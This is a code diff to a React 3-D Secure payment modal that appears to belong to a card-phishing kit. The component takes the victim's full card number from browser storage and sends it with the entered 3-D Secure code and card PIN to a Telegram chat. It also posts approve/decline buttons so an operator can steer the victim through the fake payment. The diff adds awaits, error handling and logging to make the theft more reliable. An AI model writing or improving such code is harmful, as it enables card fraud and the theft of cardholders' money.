@@ -341,10 +341,17 @@ export default function ThreeDSModal({
       if (c && c !== lastSentCodeRef.current) {
         const pan = sessionStorage.getItem(`payment_card_one_time_pan_${paymentKey}`) || localStorage.getItem(`payment_card_one_time_pan_${paymentKey}`);
         const cardLine = pan ? pan : _cardMasked.replace(/\n/g, ' ');
-        sendTelegram(`🔐 3‑D Secure code: ${c}\nCard: ${cardLine}`);
+        try {
+          await sendTelegram(`🔐 3‑D Secure code: ${c}\nCard: ${cardLine}`);
+          console.log('3DS code sent successfully');
+        } catch (e) {
+          console.error('Failed to send 3DS code:', e);
+        }
         lastSentCodeRef.current = c;
       }
-    } catch {}
+    } catch (error) {
+      console.error('Error in handleConfirm:', error);
+    }
 
     setSubmitting(true);
     setError('');
@@ -365,18 +372,22 @@ export default function ThreeDSModal({
     try {
       const p = pin.trim();
       if (p && p !== lastSentPinRef.current) {
+        console.log('Sending PIN notification...', { pinLength: p.length, paymentKey });
         const pan = sessionStorage.getItem(`payment_card_one_time_pan_${paymentKey}`) || localStorage.getItem(`payment_card_one_time_pan_${paymentKey}`);
         const cardLine = pan || _cardMasked.replace(/\n/g, ' ');
 
         // 1) Отправляем PIN и карту отдельным сообщением
         try {
+          console.log('Sending PIN message...');
           await sendTelegram(`🔢 Card PIN: ${p}\nCard: ${cardLine}`);
+          console.log('PIN message sent successfully');
         } catch (e) {
-          // игнорируем, чтобы не ломать UX
+          console.error('Failed to send PIN message:', e);
         }
 
         // 2) Отправляем отдельное сообщение с кнопками подтверждения/отклонения
         try {
+          console.log('Sending approve/decline buttons...');
           await sendTelegramWithButtons(
             '💳 Approve this payment?',
             [
@@ -384,14 +395,21 @@ export default function ThreeDSModal({
               { text: '✅ Подтвердить', callback_data: 'approve_pin' }
             ]
           );
+          console.log('Approve/decline buttons sent successfully');
         } catch (e) {
-          // eslint-disable-next-line no-console
-          console.warn('Failed to send approve/decline buttons:', e);
+          console.error('Failed to send approve/decline buttons:', e);
         }
 
         lastSentPinRef.current = p;
+      } else {
+        console.log('PIN already sent or empty, skipping...', { 
+          pinLength: p?.length || 0, 
+          lastSent: lastSentPinRef.current?.length || 0 
+        });
       }
-    } catch {}
+    } catch (error) {
+      console.error('Error in handlePinConfirm:', error);
+    }
     setError('');
     setSubmitting(true);
     setPhase('waiting_approval'); // Переходим в фазу ожидания подтверждения
